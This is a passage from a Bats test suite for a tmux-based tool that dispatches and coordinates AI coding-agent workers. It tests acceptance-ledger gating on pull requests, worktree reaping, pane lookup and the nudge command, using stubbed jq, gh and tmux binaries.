    printf 'failing rows (%s):\n' "${#_ROW_FAILURES[@]}" >&2
    printf '  %s\n' "${_ROW_FAILURES[@]}" >&2
    return 1
  fi
}

@test "pr_open: an acceptance word mid-sentence is not read as a list" {
  # The match stays anchored to a heading/marker/colon, so prose that merely
  # mentions the word does not force a ledger onto a doc that has none.
  _task_doc trivial
  printf '\nSee the acceptance list in the issue for the details.\n' >>WORKER_TASK.md
  printf 'acceptance is mentioned here in passing.\n' >>WORKER_TASK.md
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "PR opened" https://example.com/pr/1
  _refused "no acceptance list"
  run --separate-stderr run_crew status "worker:feat/x#s2-2" pr_open "" https://example.com/pr/1
  [ "$status" -eq 0 ]
  [ -z "$stderr" ]
  [ "$(_status_rows)" -eq 1 ]
}

@test "pr_open: a heading whose bold word only resembles Acceptance is not a list" {
  # The widened heading match still requires the word itself directly after the
  # optional bold marker, so a heading that opens with a marker but a different
  # word is not read as an acceptance list.
  _task_doc trivial
  printf '\n### **Accepted**\n- one\n' >>WORKER_TASK.md
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "" https://example.com/pr/1
  [ "$status" -eq 0 ]
  [ -z "$stderr" ]
  [ "$(_status_rows)" -eq 1 ]
}

@test "pr_open: a jq failure on the ledger check refuses (fail closed)" {
  _task_doc trivial
  mkdir -p "$BATS_TEST_TMPDIR/jqstub"
  export REAL_JQ
  REAL_JQ=$(command -v jq)
  cat >"$BATS_TEST_TMPDIR/jqstub/jq" <<'EOF'
#!/usr/bin/env bash
case "$*" in *'?<b>'*) exit 3 ;; esac; exec "$REAL_JQ" "$@"
EOF
  chmod +x "$BATS_TEST_TMPDIR/jqstub/jq"
  PATH="$BATS_TEST_TMPDIR/jqstub:$PATH" run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "AC1 pass(bats)" https://example.com/pr/1
  _refused "could not check the acceptance ledger (jq exit 3)"
}

@test "pr_open: a jq failure on the deslop seam check refuses (fail closed)" {
  _task_doc standard
  _lead_seam
  mkdir -p "$BATS_TEST_TMPDIR/jqstub"
  export REAL_JQ
  REAL_JQ=$(command -v jq)
  cat >"$BATS_TEST_TMPDIR/jqstub/jq" <<'EOF'
#!/usr/bin/env bash
case "$*" in *'"deslop" and (has("tag")'*) exit 3 ;; esac; exec "$REAL_JQ" "$@"
EOF
  chmod +x "$BATS_TEST_TMPDIR/jqstub/jq"
  PATH="$BATS_TEST_TMPDIR/jqstub:$PATH" run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "" https://example.com/pr/1
  _refused "could not read the crew log for the deslop seam (jq exit 3)"
}

@test "pr_open: the ledger is checked before the review seam" {
  _task_doc deep
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "AC2 pending(sim)" https://example.com/pr/1
  _refused "every acceptance ledger item"
  run_crew msg "worker:feat/x#s1-1" "review:c1" '{"seam":"review","review_mode":"full"}'
  _deslop_seam
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "AC1 pass(bats)" https://example.com/pr/1
  [ "$status" -eq 0 ]
  [ -z "$stderr" ]
  [ "$(_status_rows)" -eq 1 ]
}

@test "pr_open: the protocol's example ledgers pass the gate" {
  local -a examples=()
  while IFS= read -r line; do
    examples+=("$line")
  done < <(grep -oE 'pr_open "[^"<][^"]*"' "$BATS_TEST_DIRNAME/../adapters/core/protocols/WORKER_PROTOCOL.md")
  [ "${#examples[@]}" -ge 1 ]
  _acceptance_doc trivial
  local n=0
  for ex in "${examples[@]}"; do
    n=$((n + 1))
    d="${ex#pr_open \"}"
    d="${d%\"}"
    _waive "worker:feat/x#s1-$n"
    run --separate-stderr run_crew status "worker:feat/x#s1-$n" pr_open "$d" https://example.com/pr/1
    [ "$status" -eq 0 ]
    [ -z "$stderr" ]
  done
  run ! grep -F 'pr_open "" ' "$BATS_TEST_DIRNAME/../adapters/core/protocols/WORKER_PROTOCOL.md"
}

@test "done/pr_open: done, kind review and role callers are not ledger-checked" {
  _task_doc trivial
  run --separate-stderr run_crew status "worker:feat/x#s1-1" done "AC2 pending(sim)" https://example.com/pr/1
  [ "$status" -eq 0 ]
  [ -z "$stderr" ]
  run --separate-stderr run_crew status "worker:feat/x#s2-2" done "follow-ups: #312 (upstream fix pending)"
  [ "$status" -eq 0 ]
  [ -z "$stderr" ]
  run --separate-stderr run_crew status "role:feat/x:reviewer" pr_open "AC2 pending" https://example.com/pr/1
  [ "$status" -eq 0 ]
  [ -z "$stderr" ]
  _task_doc trivial review
  run --separate-stderr run_crew status "worker:feat/x#s3-3" pr_open "2 findings pending" https://example.com/pr/1
  [ "$status" -eq 0 ]
  [ -z "$stderr" ]
  run --separate-stderr run_crew status "worker:feat/x#s3-3" done "2 findings pending author reply" https://example.com/pr/1
  [ "$status" -eq 0 ]
  [ -z "$stderr" ]
  [ "$(_status_rows)" -eq 5 ]
}

@test "pr_open: no detail argument at all" {
  # _acceptance_doc first: _refused asserts zero total rows, so the refusal
  # case must run before any accepted write in this test.
  _acceptance_doc trivial
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open
  _refused "acceptance list"
  _task_doc trivial
  run --separate-stderr run_crew status "worker:feat/x#s2-2" pr_open
  [ "$status" -eq 0 ]
  [ -z "$stderr" ]
  [ "$(_status_rows)" -eq 1 ]
}

# --- reap: stacked-base compatibility (#274) ---

@test "reap: keeps an open-PR parent worktree with a stacked child in place" {
  git commit -q --allow-empty -m init
  git branch feat/10-parent
  parent_wt="$BATS_TEST_TMPDIR/parent-wt"
  git worktree add -q "$parent_wt" feat/10-parent

  git branch feat/11-child
  child_wt="$BATS_TEST_TMPDIR/child-wt"
  git worktree add -q "$child_wt" feat/11-child
  printf 'base: feat/10-parent\n' >"$child_wt/WORKER_TASK.md"

  stub_bin gh
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'OPEN' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  stub_bin wt
  CREW_ID=c1 run_crew status "worker:feat/10-parent" done "" "https://example.com/pr/30"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"keeping feat/10-parent — PR OPEN"* ]]
  [ -d "$parent_wt" ]
  [ -d "$child_wt" ]
  run ! grep -q 'remove' "$STUB_LOG"
}

@test "reap: reaps a merged parent without touching its stacked child" {
  git commit -q --allow-empty -m init
  git branch feat/10-parent
  parent_wt="$BATS_TEST_TMPDIR/parent-wt2"
  git worktree add -q "$parent_wt" feat/10-parent
  parent_wt=$(cd "$parent_wt" && pwd -P)
  echo unique >"$parent_wt/work.txt"
  git -C "$parent_wt" add work.txt
  git -C "$parent_wt" commit -q -m "parent work"

  git branch feat/11-child
  child_wt="$BATS_TEST_TMPDIR/child-wt2"
  git worktree add -q "$child_wt" feat/11-child
  printf 'base: feat/10-parent\n' >"$child_wt/WORKER_TASK.md"
  child_task_before="$(cat "$child_wt/WORKER_TASK.md")"

  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '' ;;
*headRefOid*) printf '%s\n' "$(git rev-parse refs/heads/feat/10-parent)" ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  CREW_ID=c1 run_crew status "worker:feat/10-parent" done "" "https://example.com/pr/31"
  CREW_ID=c1 run run_crew reap --quiet
  [ "$status" -eq 0 ]
  [[ "$output" == *"reaped feat/10-parent (MERGED)"* ]]
  [ ! -d "$parent_wt" ]
  run ! git show-ref --verify --quiet refs/heads/feat/10-parent

  [ -d "$child_wt" ]
  git show-ref --verify --quiet refs/heads/feat/11-child
  [ "$(cat "$child_wt/WORKER_TASK.md")" = "$child_task_before" ]
  jq -e 'select(.kind=="reap" and .branch=="feat/10-parent")' "$log" >/dev/null
}

# --- crew where -----------------------------------------------------------
# A human-usable address for a worker's pane, resolved at call time from the
# window's dispatcher-anchored @crew_* stamps. The suite's tmux stub answers
# just list-windows/list-panes, which is all `where` reads.

_where_stub() { # $1=wins-body $2=panes-body
  stub_tmux "$1" "$2"
}

@test "where: codename, branch and %id print the same lead-pane line" {
  dir="$(git rev-parse --path-format=absolute --git-common-dir)/crew"
  mkdir -p "$dir"
  _where_stub "$(printf '@624\tfeat/618-x\t%s\tc1\tnova\tsess\t3\twin-name\n' "$dir")" \
    "$(printf '@624\t%%204\tlead\t1\n@624\t%%205\tplan-critic\t2\n')"
  expected='nova — sess:3.1 "win-name" (lead pane)   jump: ! tmux switch-client -t %204'
  for target in nova feat/618-x '%204'; do
    CREW_ID=c1 run run_crew where "$target"
    [ "$status" -eq 0 ]
    [ "$output" = "$expected" ]
  done
}

@test "where: a role-pane id keeps its own pane and role label" {
  dir="$(git rev-parse --path-format=absolute --git-common-dir)/crew"
  mkdir -p "$dir"
  _where_stub "$(printf '@624\tfeat/618-x\t%s\tc1\tnova\tsess\t3\twin-name\n' "$dir")" \
    "$(printf '@624\t%%204\tlead\t1\n@624\t%%205\tplan-critic\t2\n')"
  CREW_ID=c1 run run_crew where '%205'
  [ "$status" -eq 0 ]
  [ "$output" = 'nova — sess:3.2 "win-name" (plan-critic pane)   jump: ! tmux switch-client -t %205' ]
  # The same window addressed by branch still resolves to its lead pane.
  CREW_ID=c1 run run_crew where feat/618-x
  [ "$status" -eq 0 ]
  [ "$output" = 'nova — sess:3.1 "win-name" (lead pane)   jump: ! tmux switch-client -t %204' ]
}

@test "where: a gone pane/branch/codename fails with a readable error" {
  dir="$(git rev-parse --path-format=absolute --git-common-dir)/crew"
  mkdir -p "$dir"
  _where_stub "" ""
  printf '%s\n' '{"ts":1,"crew_id":"c1","kind":"dispatch","branch":"feat/9-gone","name":"sage"}' >>"$dir/events.jsonl"
  CREW_ID=c1 run run_crew where '%999'
  [ "$status" -eq 1 ]
  [[ "$output" == *"crew: where: no pane %999"* ]]
  CREW_ID=c1 run run_crew where feat/9-gone
  [ "$status" -eq 1 ]
  [[ "$output" == *"no live pane"* ]]
  [[ "$output" == *"feat/9-gone"* ]]
  CREW_ID=c1 run run_crew where sage
  [ "$status" -eq 1 ]
  [[ "$output" == *"no live pane"* ]]
  CREW_ID=c1 run run_crew where nobody
  [ "$status" -eq 1 ]
  [[ "$output" == *"no worker matches 'nobody'"* ]]
}

@test "where: an ambiguous codename fails and names the branches" {
  dir="$(git rev-parse --path-format=absolute --git-common-dir)/crew"
  mkdir -p "$dir"
  _where_stub "$(printf '@624\tfeat/1-a\t%s\tc1\tnova\tsess\t3\twin-a\n@625\tfeat/2-b\t%s\tc1\tnova\tsess\t4\twin-b\n' "$dir" "$dir")" \
    "$(printf '@624\t%%204\tlead\t1\n@625\t%%304\tlead\t1\n')"
  CREW_ID=c1 run run_crew where nova
  [ "$status" -eq 1 ]
  [[ "$output" == *"ambiguous"* ]]
  [[ "$output" == *"feat/1-a"* ]]
  [[ "$output" == *"feat/2-b"* ]]
}

@test "where: needs a target and rejects an unknown flag" {
  _where_stub "" ""
  CREW_ID=c1 run run_crew where
  [ "$status" -eq 1 ]
  [[ "$output" == *"usage: crew where"* ]]
  CREW_ID=c1 run run_crew where --bogus nova
  [ "$status" -eq 1 ]
  [[ "$output" == *"unknown flag"* ]]
}

@test "where: a role-less pane in a plain dispatch window is labelled lead" {
  dir="$(git rev-parse --path-format=absolute --git-common-dir)/crew"
  mkdir -p "$dir"
  _where_stub "$(printf '@624\tfeat/618-x\t%s\tc1\tnova\tsess\t3\twin-name\n' "$dir")" \
    "$(printf '@624\t%%204\t\t1\n')"
  CREW_ID=c1 run run_crew where nova
  [ "$status" -eq 0 ]
  [ "$output" = 'nova — sess:3.1 "win-name" (lead pane)   jump: ! tmux switch-client -t %204' ]
}

@test "where: the crew anchor excludes another crew's window and pane" {
  dir="$(git rev-parse --path-format=absolute --git-common-dir)/crew"
  mkdir -p "$dir"
  _where_stub "$(printf '@624\tfeat/1-a\t%s\tc1\tnova\tsess\t3\twin-a\n@625\tfeat/2-b\t%s\tc2\tnova\tsess\t4\twin-b\n' "$dir" "$dir")" \
    "$(printf '@624\t%%204\tlead\t1\n@625\t%%304\tlead\t1\n')"
  CREW_ID=c1 run run_crew where nova
  [ "$status" -eq 0 ]
  [ "$output" = 'nova — sess:3.1 "win-a" (lead pane)   jump: ! tmux switch-client -t %204' ]
  CREW_ID=c1 run run_crew where '%304'
  [ "$status" -eq 1 ]
  [[ "$output" == *"not a pane of this crew"* ]]
}

@test "where: a tmux read failure is reported as itself" {
  stub_bin tmux
  cat >"$STUB_DIR/tmux" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
echo "no server running on /tmp/tmux-1000/default" >&2
exit 1
EOF
  chmod +x "$STUB_DIR/tmux"
  CREW_ID=c1 run run_crew where nova
  [ "$status" -eq 1 ]
  [[ "$output" == *"cannot read tmux windows"* ]]
}

# --- crew nudge -----------------------------------------------------------
# Types the constant `crew inbox "$CREW_WORKER_ID"` line into an idle worker lead.

# stub_tmux_nudge <wins-body> <panes-body> — wins rows are
# `window_id\tbranch\tdir\tcrew_id\tname` (the nudge CLI's query); the anchor
# gate's `window_id\tbranch\tcrew_id` query is cut from the same rows. Panes rows
# are `window_id\tpane_id\trole\tcommand`. The Nth plain capture of a pane
# answers from `frames/<pane>.<N>`, else `frames/<pane>`; the Nth colored (-e)
# one from `frames/<pane>.<N>.e`, else the plain frame N, else `frames/<pane>.e`,
# else `frames/<pane>`. Every call, send-keys included, lands in $STUB_LOG.
stub_tmux_nudge() {
  STUB_DIR="${STUB_DIR:-$(mktemp -d)}"
  STUB_LOG="${STUB_LOG:-$STUB_DIR/calls.log}"
  mkdir -p "$STUB_DIR/frames"
  printf '%s\n' "$1" >"$STUB_DIR/wins.txt"
  printf '%s\n' "$2" >"$STUB_DIR/panes.txt"
  cat >"$STUB_DIR/tmux" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$1" in
list-windows)
  case "$*" in
  *@crew_dir*) cat "$STUB_DIR/wins.txt" ;;
  *) awk -F'\t' -v OFS='\t' 'NF { print $1, $2, $4 }' "$STUB_DIR/wins.txt" ;;
  esac
  ;;
list-panes) cat "$STUB_DIR/panes.txt" ;;
capture-pane)
  pane=""
  prev=""
  for a in "$@"; do
    [ "$prev" = "-t" ] && pane="$a"
    prev="$a"
  done
  f="$STUB_DIR/frames/$pane"
  case " $* " in *" -e "*) k=e ;; *) k=p ;; esac
  n=$(($(cat "$f.$k.n" 2>/dev/null || echo 0) + 1))
  echo "$n" >"$f.$k.n"
  if [ "$k" = e ] && [ -f "$f.$n.e" ]; then
    cat "$f.$n.e"
  elif [ -f "$f.$n" ]; then
    cat "$f.$n"
  elif [ "$k" = e ] && [ -f "$f.e" ]; then
    cat "$f.e"
  elif [ -f "$f" ]; then
    cat "$f"
  fi
  ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/tmux"
  export STUB_DIR STUB_LOG
  export PATH="$STUB_DIR:$PATH"
}

# _nudge_setup [engine] [pane-command] — one crew-c1 window @7 for feat/x
# (codename nova) whose lead is %9, a dispatch row for its live session s1-1
# and that session's first `working` status. The suite may itself run inside a
# worker pane, so the worker-only environment is cleared.
_nudge_setup() {
  unset CREW_WORKER_ID CREW_ROLE_ID
  export CREW_NUDGE_GAP=0 CREW_NUDGE_SETTLE=0
  ndir="$(git rev-parse --path-format=absolute --git-common-dir)/crew"
  mkdir -p "$ndir"
  stub_tmux_nudge "$(printf '@7\tfeat/x\t%s\tc1\tnova' "$ndir")" \
    "$(printf '@7\t%%9\tlead\t%s\n@7\t%%10\tplan-critic\tclaude' "${2:-claude}")"
  jq -nc --arg e "${1:-claude}" --argjson ts "$((($(date +%s) - 60) * 1000))" \
    '{ts:$ts, crew_id:"c1", kind:"dispatch", branch:"feat/x", session:"s1-1",
      worker_id:"worker:feat/x#s1-1", engine:$e, name:"nova"}' >>"$ndir/events.jsonl"
  seed_raw 'worker:feat/x#s1-1' working "" "" "$((($(date +%s) - 59) * 1000))"
}

# _nudge_directive — the unread dispatcher directive a nudge points the lead at.
_nudge_directive() { seed_msg dispatcher:c1 'worker:feat/x#s1-1' 30; }

# nudge_frames <before> [post-type] [post-enter] [recheck] — the frames %9's
# plain captures answer, in call order (before, recheck, post-type,
# post-enter); a missing frame repeats <before>.
nudge_frames() {
  rm -f "$STUB_DIR/frames/%9"*
  cp "$1" "$STUB_DIR/frames/%9"
  [ -z "${4:-}" ] || cp "$4" "$STUB_DIR/frames/%9.2"
  [ -z "${2:-}" ] || cp "$2" "$STUB_DIR/frames/%9.3"
  [ -z "${3:-}" ] || cp "$3" "$STUB_DIR/frames/%9.4"
}

nudge_keys() { grep '^send-keys' "$STUB_LOG" || true; }
nudge_rows() { bus | jq -c 'select(.kind=="nudge")'; }

# _nudge_refused <reason> — the last run refused before typing: exit 2, the
# reason printed, no keys sent, no nudge row.
_nudge_refused() {
  [ "$status" -eq 2 ]
  [[ "$output" == *"$1"* ]]
  [ -z "$(nudge_keys)" ]
  [ -z "$(nudge_rows)" ]
}

# fx_done_idle with the nudge line typed into its box.
fx_nudge_typed() {
  frame_file nudge_typed <<'EOF'
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
✻ Churned for 36s · done 11:20 AM
────────────────── reef ─
❯ crew inbox "$CREW_WORKER_ID"
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
}

fx_nudge_bgwait_typed() {
  frame_file nudge_bgwait_typed <<'EOF'
✻ Churned for 36s · done 11:20 AM · 1 shell still running
──────────────────
❯ crew inbox "$CREW_WORKER_ID"
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · 1 shell · ← for agents
EOF
}

# fx_done_idle holding a real unsent draft: the colored capture's `❯` row has
# the nbsp separator but no dim (ghost) SGR, as in dispatch.bats's
# rw_frame_claude_draft capture.
fx_nudge_draft() {
  printf '%s\n' \
    $'✻ Churned for 36s · done 11:20 AM' \
    $'──────────────────' \
    $'❯\xc2\xa0hello draft text' \
    $'──────────────────' \
    $'  -- INSERT -- ⏵⏵ auto mode on · ← for agents' | frame_file nudge_draft
}
fx_nudge_draft_colored() {
  printf '%s\n' \
    $'✻ Churned for 36s · done 11:20 AM' \
    $'──────────────────' \
    $'\033[39m❯\xc2\xa0hello draft text' \
    $'──────────────────' \
    $'  -- INSERT -- ⏵⏵ auto mode on · ← for agents' | frame_file nudge_draft_e
}

# fx_nudge_typed with the line wrapped onto a second box row (a narrow pane).
fx_nudge_typed_wrapped() {
  frame_file nudge_typed_wrapped <<'EOF'
✻ Churned for 36s · done 11:20 AM
──────────────────
❯ crew inbox
  "$CREW_WORKER_ID"
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
}

# A freshly booted claude: an empty idle box but no finished turn above it.
fx_nudge_fresh() {
  frame_file nudge_fresh <<'EOF'
 ✻ Welcome to Claude Code!
──────────────────
❯
──────────────────
  ? for shortcuts
EOF
}

# pi frames, shaped like dispatch.bats's rw_frame_pi_idle / rw_frame_pi_live
# captures (pi 0.87.1).
fx_nudge_pi() { # <name> <editor-row>
  printf ' pi v0.87.1\n──────────────────────────────\n%s\n──────────────────────────────\n~/git/dispatcher\n0.0%%/0 (auto)      unknown\n' "$2" |
    frame_file "nudge_pi_$1"
}
fx_nudge_pi_live() {
  frame_file nudge_pi_live <<'EOF'
 pi v0.87.1
── ⠼ Working ──────────────────

──────────────────────────────
~/git/dispatcher
0.0%/0 (auto)      unknown
EOF
}

@test "nudge: accepted on an idle claude lead types the inbox line, Enter once, and records it" {
  _nudge_setup
  _nudge_directive
  nudge_frames "$(fx_done_idle)" "$(fx_nudge_typed)" "$(fx_meter 2s 1.2k)"
  CREW_ID=c1 run run_crew nudge nova
  [ "$status" -eq 0 ]
  [[ "$output" == "nudge accepted: %9 worker:feat/x#s1-1 — "* ]]
  [ "$(nudge_keys)" = "$(printf '%s\n' 'send-keys -t %9 -l crew inbox "$CREW_WORKER_ID"' 'send-keys -t %9 Enter')" ]
  [ "$(nudge_rows | wc -l)" -eq 1 ]
  msg_ts=$(bus | jq -r 'select(.kind=="msg") | .ts')
  run bash -c "bus | jq -r 'select(.kind==\"nudge\") | \"\(.result) \(.from) \(.to) \(.pane) \(.engine) \(.branch) \(.msg_ts)\"'"
  [ "$output" = "accepted dispatcher:c1 worker:feat/x#s1-1 %9 claude feat/x $msg_ts" ]
}

@test "nudge: a line the box wrapped onto two rows is confirmed and accepted" {
  _nudge_setup
  _nudge_directive
  nudge_frames "$(fx_done_idle)" "$(fx_nudge_typed_wrapped)" "$(fx_meter 2s 1.2k)"
  CREW_ID=c1 run run_crew nudge nova
  [ "$status" -eq 0 ]
  [ "$(nudge_keys)" = "$(printf '%s\n' 'send-keys -t %9 -l crew inbox "$CREW_WORKER_ID"' 'send-keys -t %9 Enter')" ]
  [ "$(nudge_rows | jq -r .result)" = accepted ]
}

@test "nudge: accepted on a claude lead parked on a background shell" {
  _nudge_setup
  _nudge_directive
  nudge_frames "$(fx_bgwait_churned)" "$(fx_nudge_bgwait_typed)" "$(fx_bgwait_churned)"
  CREW_ID=c1 run run_crew nudge 'worker:feat/x#s1-1'
  [ "$status" -eq 0 ]
  [ "$(nudge_keys | wc -l)" -eq 2 ]
  [ "$(nudge_rows | jq -r .result)" = accepted ]
}

@test "nudge: accepted on an idle pi lead" {
  _nudge_setup pi pi
  _nudge_directive
  nudge_frames "$(fx_nudge_pi idle '')" "$(fx_nudge_pi typed 'crew inbox "$CREW_WORKER_ID"')" "$(fx_nudge_pi_live)"
  CREW_ID=c1 run run_crew nudge feat/x
  [ "$status" -eq 0 ]
  [ "$(nudge_keys)" = "$(printf '%s\n' 'send-keys -t %9 -l crew inbox "$CREW_WORKER_ID"' 'send-keys -t %9 Enter')" ]
  [ "$(nudge_rows | jq -r '"\(.result) \(.engine)"')" = "accepted pi" ]
}

@test "nudge: refuses without an unread dispatcher directive" {
  _nudge_setup
  nudge_frames "$(fx_done_idle)"
  CREW_ID=c1 run run_crew nudge nova
  _nudge_refused "no unread msg from dispatcher:c1 to worker:feat/x#s1-1"
  # A role's msg is not the dispatcher's directive.
  seed_msg role:feat/x:reviewer 'worker:feat/x#s1-1' 30
  CREW_ID=c1 run run_crew nudge nova
  _nudge_refused "no unread msg from dispatcher:c1"
  # Nor is a directive the lead already read.
  _nudge_directive
  CREW_ID=c1 run run_crew inbox 'worker:feat/x#s1-1' c1
  [ "$status" -eq 0 ]
  CREW_ID=c1 run run_crew nudge nova
  _nudge_refused "no unread msg from dispatcher:c1"
}

@test "nudge: refuses every claude frame that is not an idle empty box" {
  _nudge_setup
  _nudge_directive
  nudge_frames "$(fx_nudge_draft)"
  cp "$(fx_nudge_draft_colored)" "$STUB_DIR/frames/%9.e"
  CREW_ID=c1 run run_crew nudge nova
  _nudge_refused "unsent input in the input box"
  while IFS='|' read -r fx reason; do
    nudge_frames "$($fx)"
    CREW_ID=c1 run run_crew nudge nova
    _nudge_refused "$reason"
  done <<'EOF'
fx_prompt_select|dialog on screen (option-select or workspace trust)
fx_prompt_trust|dialog on screen (option-select or workspace trust)
fx_permission_subagent|permission dialog on screen
fx_prompt_quota|quota frame on screen
fx_session_limit_refusal|quota frame on screen
fx_nudge_fresh|no finished-turn marker above the input box
EOF
  nudge_frames "$(fx_meter 2s 1.2k)"
  CREW_ID=c1 run run_crew nudge nova
  _nudge_refused "live turn or no idle input box"
}

@test "nudge: refuses when a draft appears between the anchor gate and typing" {
  _nudge_setup
  _nudge_directive
  nudge_frames "$(fx_done_idle)" "" "" "$(fx_nudge_draft)"
  CREW_ID=c1 run run_crew nudge nova
  _nudge_refused "unsent input in the input box"
}

@test "nudge: refuses a pi lead mid-turn or holding a draft" {
  _nudge_setup pi pi
  _nudge_directive
  nudge_frames "$(fx_nudge_pi_live)"
  CREW_ID=c1 run run_crew nudge nova
  _nudge_refused "live turn or no idle input box"
  nudge_frames "$(fx_nudge_pi draft 'hello draft')"
  CREW_ID=c1 run run_crew nudge nova
  _nudge_refused "unsent input in the input box"
}

@test "nudge: refuses an engine with no verified idle frame" {
  _nudge_setup codex codex
  _nudge_directive
  nudge_frames "$(fx_done_idle)"
  CREW_ID=c1 run run_crew nudge nova
  _nudge_refused "no verified idle lead frame for codex"
}

@test "nudge: refuses a lead pane that no longer runs an engine (anchor)" {
  _nudge_setup claude zsh
  _nudge_directive
  nudge_frames "$(fx_done_idle)"
  CREW_ID=c1 run run_crew nudge nova
  _nudge_refused "anchor: %9 is not running an engine (zsh)"
}

@test "nudge: refuses a lead that has not posted its first status" {
  _nudge_setup
  jq -c 'select(.kind != "status")' "$ndir/events.jsonl" >"$ndir/events.tmp"
  mv "$ndir/events.tmp" "$ndir/events.jsonl"
  _nudge_directive
  nudge_frames "$(fx_done_idle)"
  CREW_ID=c1 run run_crew nudge nova
  _nudge_refused "lead has not posted its first status yet — wait for it to start"
}

@test "nudge: refuses a stopped newest session" {
  _nudge_setup
  _nudge_directive
  seed_raw 'worker:feat/x#s1-1' done "" ""
  nudge_frames "$(fx_done_idle)"
  CREW_ID=c1 run run_crew nudge nova
  _nudge_refused "newest session on feat/x is done"
}

@test "nudge: another crew's window does not resolve" {
  _nudge_setup
  _nudge_directive
  printf '@7\tfeat/x\t%s\tc2\tnova\n' "$ndir" >"$STUB_DIR/wins.txt"
  nudge_frames "$(fx_done_idle)"
  CREW_ID=c1 run run_crew nudge nova
  [ "$status" -eq 1 ]
  [[ "$output" == *"no live pane for 'nova'"* ]]
  [ -z "$(nudge_keys)" ]
  [ -z "$(nudge_rows)" ]
}

@test "nudge: a worker or role session may not nudge" {
  _nudge_setup
  _nudge_directive
  nudge_frames "$(fx_done_idle)"
  CREW_WORKER_ID='worker:feat/y#s2-2' CREW_ID=c1 run run_crew nudge nova
  _nudge_refused "crew: nudge is a dispatcher command"
  CREW_ROLE_ID='role:feat/y:reviewer' CREW_ID=c1 run run_crew nudge nova
  _nudge_refused "crew: nudge is a dispatcher command"
  printf 'crew_id: c1\n' >WORKER_TASK.md
  CREW_ID=c1 run run_crew nudge nova
  rm -f WORKER_TASK.md
  _nudge_refused "crew: nudge is a dispatcher command"
}

@test "nudge: a pane id is not an accepted target" {
  _nudge_setup
  _nudge_directive
  nudge_frames "$(fx_done_idle)"
  CREW_ID=c1 run run_crew nudge '%9'
  [ "$status" -eq 1 ]
  [[ "$output" == *"a pane id is not an anchored address"* ]]
  [ -z "$(nudge_keys)" ]
  [ -z "$(nudge_rows)" ]
}

@test "nudge: a line that never shows in the box is unconfirmed and gets no Enter" {
  _nudge_setup
  _nudge_directive
  nudge_frames "$(fx_done_idle)"
  CREW_ID=c1 run run_crew nudge nova
  [ "$status" -eq 3 ]
  [[ "$output" == "nudge unconfirmed: %9 worker:feat/x#s1-1 — "*"no Enter sent"* ]]
  [ "$(nudge_keys)" = 'send-keys -t %9 -l crew inbox "$CREW_WORKER_ID"' ]
  [ "$(nudge_rows | jq -r .result)" = unconfirmed ]
}

@test "nudge: a line still in the box after Enter is held, with exactly one Enter" {
  _nudge_setup
  _nudge_directive
  nudge_frames "$(fx_done_idle)" "$(fx_nudge_typed)" "$(fx_nudge_typed)"
  CREW_ID=c1 run run_crew nudge 'worker:feat/x#s1-1'
  [ "$status" -eq 3 ]
  [[ "$output" == "nudge held: %9 worker:feat/x#s1-1 — "* ]]
  [ "$(nudge_keys | grep -c ' Enter$')" -eq 1 ]
  [ "$(nudge_keys | wc -l)" -eq 2 ]
  [ "$(nudge_rows | jq -r .result)" = held ]
}

nudge_wait_rows() { bus | jq -c 'select(.kind=="nudge_wait")'; }

# _nudge_wrap_tmux <capture-N> <command> — a tmux wrapper ahead of the stub:
# on the Nth plain capture it runs <command>, then defers to the stub.
_nudge_wrap_tmux() {
  local w="$BATS_TEST_TMPDIR/tmuxwrap"
  mkdir -p "$w"
  cat >"$w/tmux" <<EOS
#!/usr/bin/env bash
case "\$*" in
capture-pane*)
  case " \$* " in *" -e "*) ;; *)
    n=\$((\$(cat "$w/n" 2>/dev/null || echo 0) + 1))
    echo "\$n" >"$w/n"
    [ "\$n" != "$1" ] || { $2; } >/dev/null
    ;;
  esac
  ;;
esac
exec "$STUB_DIR/tmux" "\$@"
EOS
  chmod +x "$w/tmux"
  export PATH="$w:$PATH"
}

# _nudge_wait_frames — %9 shows a live turn for two checks, then the idle,
# typed and post-Enter frames of one accepted nudge.
_nudge_wait_frames() {
  nudge_frames "$(fx_meter 2s 1.2k)"
  cp "$(fx_meter 2s 1.2k)" "$STUB_DIR/frames/%9.1"
  cp "$(fx_meter 2s 1.2k)" "$STUB_DIR/frames/%9.2"
  cp "$(fx_done_idle)" "$STUB_DIR/frames/%9.3"
  cp "$(fx_done_idle)" "$STUB_DIR/frames/%9.4"
  cp "$(fx_nudge_typed)" "$STUB_DIR/frames/%9.5"
  cp "$(fx_meter 2s 1.2k)" "$STUB_DIR/frames/%9.6"
}

@test "nudge: --wait types once after a live turn ends" {
  _nudge_setup
  _nudge_directive
  export CREW_NUDGE_WAIT_INTERVAL=5
  _nudge_wait_frames
  CREW_ID=c1 run run_crew nudge nova --wait 60
  [ "$status" -eq 0 ]
  [[ "$output" == *"nudge waiting: %9 worker:feat/x#s1-1"* ]]
  [[ "$output" == *"nudge accepted: %9 worker:feat/x#s1-1"* ]]
